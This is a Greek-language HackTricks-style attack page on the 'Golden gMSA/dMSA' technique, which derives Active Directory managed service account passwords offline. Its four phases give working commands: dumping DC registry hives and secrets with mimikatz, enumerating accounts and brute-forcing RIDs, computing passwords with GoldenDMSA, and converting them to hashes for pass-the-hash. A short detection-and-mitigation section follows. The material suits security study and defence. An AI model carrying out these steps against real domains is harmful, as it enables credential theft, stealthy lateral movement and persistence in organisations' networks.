# Χρυσή επίθεση gMSA/dMSA (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Windows Managed Service Accounts (MSA) είναι ειδικοί φορείς σχεδιασμένοι να εκτελούν υπηρεσίες χωρίς την ανάγκη χειροκίνητης διαχείρισης των κωδικών τους.
Υπάρχουν δύο κύριες παραλλαγές:

1. **gMSA** – group Managed Service Account – μπορεί να χρησιμοποιηθεί σε πολλαπλούς hosts που είναι εξουσιοδοτημένοι στο `msDS-GroupMSAMembership` attribute.
2. **dMSA** – delegated Managed Service Account – ο (preview) διάδοχος του gMSA, που βασίζεται στην ίδια κρυπτογραφία αλλά επιτρέπει πιο λεπτομερείς σενάρια αντιπροσώπευσης.

Για και τις δύο παραλλαγές, ο **κωδικός δεν αποθηκεύεται** σε κάθε Domain Controller (DC) όπως ένας κανονικός NT-hash. Αντίθετα, κάθε DC μπορεί να **παράγει** τον τρέχοντα κωδικό on-the-fly από:

* Το δασικό **KDS Root Key** (`KRBTGT\KDS`) – τυχαία παραγόμενο GUID-ονομασμένο μυστικό, αναπαραγόμενο σε κάθε DC κάτω από το `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container.
* Το **SID** του στόχου λογαριασμού.
* Ένα ανά λογαριασμό **ManagedPasswordID** (GUID) που βρίσκεται στο `msDS-ManagedPasswordId` attribute.

Η παραγωγή είναι: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob τελικά **base64-encoded** και αποθηκευμένο στο `msDS-ManagedPassword` attribute.
Δεν απαιτείται καμία κίνηση Kerberos ή αλληλεπίδραση με το domain κατά τη διάρκεια της κανονικής χρήσης του κωδικού – ένας μέλος host παράγει τον κωδικό τοπικά όσο γνωρίζει τις τρεις εισόδους.

## Χρυσή επίθεση gMSA / Χρυσή dMSA επίθεση

Εάν ένας επιτιθέμενος μπορεί να αποκτήσει και τις τρεις εισόδους **offline**, μπορεί να υπολογίσει **έγκυρους τρέχοντες και μελλοντικούς κωδικούς** για **οποιοδήποτε gMSA/dMSA στο δάσος** χωρίς να αγγίξει ξανά το DC, παρακάμπτοντας:

* Kerberos προ-αυθεντικοποίηση / logs αιτημάτων εισιτηρίων
* LDAP ανάγνωση ελέγχου
* Διαστήματα αλλαγής κωδικών (μπορούν να προϋπολογίσουν)

Αυτό είναι ανάλογο με ένα *Golden Ticket* για λογαριασμούς υπηρεσιών.

### Προαπαιτούμενα

1. **Συμβιβασμός σε επίπεδο δάσους** ενός **DC** (ή Enterprise Admin). Η πρόσβαση `SYSTEM` είναι αρκετή.
2. Δυνατότητα καταμέτρησης λογαριασμών υπηρεσιών (LDAP read / RID brute-force).
3. .NET ≥ 4.7.2 x64 workstation για να τρέξει [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ή ισοδύναμο κώδικα.

### Φάση 1 – Εξαγωγή του KDS Root Key

Dump από οποιοδήποτε DC (Volume Shadow Copy / raw SAM+SECURITY hives ή απομακρυσμένα μυστικά):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
Η συμβολοσειρά base64 που ονομάζεται `RootKey` (όνομα GUID) απαιτείται σε επόμενα βήματα.

### Φάση 2 – Καταμέτρηση αντικειμένων gMSA/dMSA

Ανακτήστε τουλάχιστον `sAMAccountName`, `objectSid` και `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) υλοποιεί βοηθητικές λειτουργίες:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Φάση 3 – Μαντέψτε / Ανακαλύψτε το ManagedPasswordID (όταν λείπει)

Ορισμένες αναπτύξεις *αφαιρούν* το `msDS-ManagedPasswordId` από τις αναγνώσεις που προστατεύονται από ACL. 
Δεδομένου ότι το GUID είναι 128-bit, η απλή βίαιη δοκιμή είναι μη εφικτή, αλλά:

1. Τα πρώτα **32 bits = Unix epoch time** της δημιουργίας του λογαριασμού (ανάλυση λεπτών).
2. Ακολουθούν 96 τυχαία bits.

Επομένως, μια **στενή λίστα λέξεων ανά λογαριασμό** (± λίγες ώρες) είναι ρεαλιστική.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Το εργαλείο υπολογίζει υποψήφιες κωδικούς πρόσβασης και συγκρίνει το base64 blob τους με το πραγματικό `msDS-ManagedPassword` attribute – η αντιστοιχία αποκαλύπτει το σωστό GUID.

### Φάση 4 – Υπολογισμός & Μετατροπή Κωδικού Πρόσβασης Εκτός Σύνδεσης

Μόλις γνωρίζεται το ManagedPasswordID, ο έγκυρος κωδικός πρόσβασης είναι ένα βήμα μακριά:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Οι παραγόμενοι κατακερματισμοί μπορούν να εισαχθούν με **mimikatz** (`sekurlsa::pth`) ή **Rubeus** για κατάχρηση Kerberos, επιτρέποντας κρυφή **πλευρική κίνηση** και **επιμονή**.

## Ανίχνευση & Μετριασμός

* Περιορίστε τις δυνατότητες **αντίγραφου ασφαλείας DC και ανάγνωσης μητρώου** σε διαχειριστές Tier-0.
* Παρακολουθήστε τη δημιουργία **Λειτουργίας Επαναφοράς Υπηρεσιών Καταλόγου (DSRM)** ή **Αντιγράφου Σκιάς Όγκου** σε DCs.
* Ελέγξτε τις αναγνώσεις / αλλαγές στα `CN=Master Root Keys,…` και τις σημαίες `userAccountControl` των λογαριασμών υπηρεσιών.
* Ανιχνεύστε ασυνήθιστες **εγγραφές κωδικών πρόσβασης base64** ή ξαφνική επαναχρησιμοποίηση κωδικών πρόσβασης υπηρεσιών σε διάφορους υπολογιστές.
* Σκεφτείτε να μετατρέψετε τις υψηλής προνομιακής gMSAs σε **κλασικούς λογαριασμούς υπηρεσιών** με κανονικές τυχαίες περιστροφές όπου η απομόνωση Tier-0 δεν είναι δυνατή.

## Εργαλεία

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – αναφορά υλοποίησης που χρησιμοποιείται σε αυτή τη σελίδα.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket χρησιμοποιώντας παραγόμενα κλειδιά AES.

## Αναφορές

- [Golden dMSA – παράκαμψη αυθεντικοποίησης για εξουσιοδοτημένους Διαχειριζόμενους Λογαριασμούς Υπηρεσιών](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Αποθετήριο GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Χρυσή επίθεση εμπιστοσύνης gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
